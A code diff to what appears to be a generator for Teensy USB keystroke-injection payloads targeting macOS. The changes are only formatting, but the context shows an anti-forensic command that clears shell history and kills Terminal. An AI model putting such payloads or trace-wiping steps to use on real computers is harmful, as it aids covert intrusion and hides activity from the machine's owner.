@@ -22,7 +22,8 @@ class payload:
 		shell_command += "history -wc;killall Terminal"
 		
 		payload_save_path = "payloads/teensy_macos.ino"
-		payload = """#include "Keyboard.h"
+		payload = """\
+#include "Keyboard.h"
 const int LED = 13;
 void setup() {
   pinMode(LED, OUTPUT);
@@ -56,7 +57,6 @@ void loop() {
   delay(100);
   digitalWrite(LED, LOW);
   delay(100);
-  // put your main code here, to run repeatedly:
 }"""
 		f = open(payload_save_path,"w")
 		f.write(payload)
